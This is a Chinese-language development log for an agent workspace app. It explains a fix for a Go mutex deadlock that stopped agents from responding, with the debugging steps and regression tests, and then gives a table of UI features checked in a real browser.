`worktree-bootstrap.ts` 1101 · `worktree-session.ts` 929 · `workspace-reconciliation-service.ts` ·
`workspace-archive-service.ts` · `workspace-auto-name.ts` · `workspace-bootstrap-dedupe.ts` ·
`workspace-source.ts` · `agent-history-search.ts` · `checkout-diff-manager.ts` ·
`resolve-workspace-id-for-path.ts` · `persisted-config.ts` · 以及其余 55 个。

---

## 批次 2-9

未开始。范围见 Issue。

## 已修复：agent 创建后不产出任何响应（重复加锁死锁）

### 根因

`handleRawEvent` 在 **持有 `s.mu` 的情况下** 处理每个 pi 事件，而它调用的
`handleEntryCaptureNotification` / `handleCommandResultNotification` 内部又 `s.mu.Lock()`。
Go 的 `sync.Mutex` 不可重入，于是 stdout 读循环**永久死锁**。

触发条件极其具体：pi 扩展必须在 `session_start` 时发一条 `BYSPACE_ENTRY_CAPTURE` 通知。
没有扩展时锁不会被重入，所以「无扩展 → 有响应，有扩展 → 无响应」。

这正是它难查的原因：pi 子进程**行为完全正常**（trace 显示 `agent_start`、`message_update`、
`turn_end`、`agent_end` 全部到达、顺序正确），只是 Go 再也没读下一行。外部表现是
「代理接受了 prompt 然后什么都不做，没有任何错误」。

### 定位过程

1. 给 `jsonl.Process` 加持久化协议 trace（`BYSPACE_PI_TRACE=<path>`），写入两个方向的每一帧。
   用 stderr 是不行的：daemon 自己的日志会与之交错。
2. trace 显示 pi 发了 295 行、含完整事件序列 → 问题在 Go 侧。
3. 用 `BYSPACE_PI_EXTENSION_PATH` 逐个替换扩展：**无扩展 → 正常**。
4. 把扩展拆成最小片段二分：`session_start` + 发 `BYSPACE_ENTRY_CAPTURE` → 阻塞；
   同一钩子发普通文本 → 正常。到此锁定为「标记 + 回环处理」的组合。

### 顺带修掉的两个真 bug

- **`PI_SESSION_FILE` 等 pi 会话身份泄漏**：从 pi agent 内部启动的 daemon（本仓库的开发循环）
  会导出这些变量，子 pi 继承后往父 transcript 追加而不是开新会话。已加入剥离列表。
- **`syncPiPersistence` 抢跑**：启动时立刻发 `get_state`，而 pi 在 runtime 就绪前不响应，
  把 stdio 队列堵在那里。

### 验证

- 回归测试 `TestExtensionNotificationDoesNotDeadlock`：持锁调用通知，3 秒超时。
  已验证恢复死锁代码后该测试 **panic: test timed out**。
- 端到端：`tools: ["bash:running","bash:running","bash:running","bash:completed"]`，
  模型真的调用了 bash 工具并拿到输出。
- `npm run audit` 的浏览器检查从 **7/8** 变成 **10/10** —— 之前那一项一直是这个死锁造成的
  假失败（页面拿不到 agent 响应，思考菜单状态也就无从检查）。

## 2026-10-21 全功能走查（真实浏览器）

死锁修复后第一次完整走查。**这是首次 agent 真正能对话**，此前所有「已实现」的项都无法验证。

| 项目           | 结果       | 证据                                                                                                                                       |
| -------------- | ---------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| 侧边栏         | ✅         | Chief 置顶（`BySpace-WorkSpace` 下第一个），其后 byspace / chat / server / tmp / gt 分组，右上角 `+`/History/排序/显示偏好齐全             |
| 新建 Agent tab | ✅         | `New tab` → 菜单 `Agent ⇧⌘A` / `Terminal ⇧⌘T`，fallback 到 Terminal profiles（Claude Code / Codex）                                        |
| 真实对话       | ✅         | `Thinking` 折叠块 → `Shell echo WALKTHROUGH_OK` 工具卡片 → 输出 `WALKTHROUGH_OK` → `Worked for 4s, ended 1:28 PM`                          |
| 工具卡片展开   | ✅         | `$` / `echo WALKTHROUGH_OK` / `WALKTHROUGH_OK` 三段都在                                                                                    |
| 上下文用量环   | ✅         | `Context window 2% used`（这是 `lastUsage` 的验证，之前一直空）                                                                            |
| 消息操作       | ✅         | `Rewind to this message`、`Copy message`、`Copy turn`、`Fork chat from here`、`Collapse all tool calls`                                    |
| 思考档位       | ✅         | `Select thinking option (Max)`，模型 `DeepSeek V4.1 Flash` → `Select model`                                                                |
| 终端           | ✅         | canvas 渲染（observe 抓不到文本），真实敲 `echo TERMINAL_LIVE_OK` 有回显，提示符显示 `.dev/byspace-home/chief on git main`                 |
| Settings 一级  | ✅         | Overview / Projects / Connections / Agents / Usage 五项                                                                                    |
| Agents 页      | ✅         | Claude Code / Codex / OpenCode / Pi 都在，`Orchestration skills` 区块正常                                                                  |
| Usage 页       | ✅         | Codex / Z.ai 各显示 `Unavailable`（未配凭据时的正确表述，不是空数组）                                                                      |
| History        | ✅         | 搜索框可用，`Import session` 弹窗列出本机真实 pi 会话                                                                                      |
| Explorer       | ✅（有限） | `Files` / `Changes` / `Browse workspace files` / `Working tree diff` 都在；当前工作区不是 git 仓库，显示 `Not a git repository` 是正确行为 |

### 仍未走查

- **git 仓库工作区**的 Changes / Commits / Diff（需要一个有未提交改动的 git 工作区）
- **PWA 安装与离线**、手机尺寸布局
- **Relay E2E**（需要第二个设备或真实 relay 地址）

### 顺手发现的环境噪音

`.dev/byspace-home` 里积累了大量 e2e 测试留下的工作区（`chat`、`server/Chief check`、`tmp`、`gt/test-slug` 等）。
不影响功能，但走查时会把真实项目与测试残留混在一起。
